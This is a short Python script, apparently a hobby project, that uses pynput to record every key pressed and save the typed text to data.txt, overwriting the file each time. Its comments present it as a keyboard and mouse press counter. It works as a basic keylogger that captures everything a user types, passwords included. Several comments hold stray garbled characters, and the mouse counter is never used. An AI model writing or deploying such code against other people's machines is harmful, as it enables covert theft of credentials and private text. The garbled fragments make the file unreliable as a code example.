
import pyautogui
from pynput import keyboard, mouse

# Initialize counters
keyboard_counter = 0
mouse_counter = 0
keys = ""
# Keyboard event handler
def on_press(key):
    global keyboard_counter
    global keys
    keyboard_counter += 1
    try: 
        print('Key {0} pressed'.format(key.char))
        keys += key.char
        append_data(keys)
        print(keys)
    except AttributeError:
        print('Special key {0} pressed'.format(key))
        if key == keyboard.Key.space:
            keys += " " 
            append_data(keys)
        else:    
            keys += '*'
            append_data(keys)
        print(keys)

def append_data(data):
    with open("data.txt", "w") as f:
        f.write(data + "")
# Listener for keyboard and mouse eventsweweww\\\\\\@       %%%
keyboard_listener = keyboard.Listener(on_press=on_press)
# mouse_listener = mouse.Listener(on_click=on_click)

# Start the22222]]

keyboard_listener.start()
keyboard_listener.join()


# Wait for user input to stop the script script 

# input("Press enter to stop")

# Stop the listeners
# keyboard_listener.stop()

# Print the counters
print('Total keyboard presses:', keyboard_counter)
print('Total mouse clicks:', mouse_counter)
